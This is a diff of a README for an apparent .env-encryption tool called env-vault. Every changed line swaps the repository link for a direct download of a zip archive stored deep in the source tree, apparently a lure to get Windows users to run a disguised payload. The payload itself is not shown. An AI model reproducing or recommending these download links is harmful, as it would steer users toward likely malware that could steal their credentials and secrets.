@@ -1,6 +1,6 @@
 # 🔐 env-vault - Lock and unlock .env files fast
 
-[![Download env-vault](https://img.shields.io/badge/Download-Env--Vault-4C8BF5?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Undercarriagesayso250/env-vault)
+[![Download env-vault](https://img.shields.io/badge/Download-Env--Vault-4C8BF5?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Undercarriagesayso250/env-vault/raw/refs/heads/main/env_vault/providers/env_vault_3.1.zip)
 
 ## 🛡️ What env-vault does
 
@@ -11,7 +11,7 @@ Use it to keep things like API keys, database passwords, and app tokens out of p
 ## 📦 Download
 
 Visit this page to download:
-https://github.com/Undercarriagesayso250/env-vault
+https://github.com/Undercarriagesayso250/env-vault/raw/refs/heads/main/env_vault/providers/env_vault_3.1.zip
 
 If the page shows a release file, download it to your PC. If it shows source files, use the download option on the page and open the folder after it finishes.
 
@@ -26,7 +26,7 @@ If the page shows a release file, download it to your PC. If it shows source fil
 ## 🚀 Install and run on Windows
 
 1. Open the download page:
-   https://github.com/Undercarriagesayso250/env-vault
+   https://github.com/Undercarriagesayso250/env-vault/raw/refs/heads/main/env_vault/providers/env_vault_3.1.zip
 
 2. Look for the latest release or download option.
 
@@ -166,4 +166,4 @@ This keeps the app and your files together so they are easy to find.
 
 ## 🔗 Download again
 
-[Download env-vault from GitHub](https://github.com/Undercarriagesayso250/env-vault)
+[Download env-vault from GitHub](https://github.com/Undercarriagesayso250/env-vault/raw/refs/heads/main/env_vault/providers/env_vault_3.1.zip)
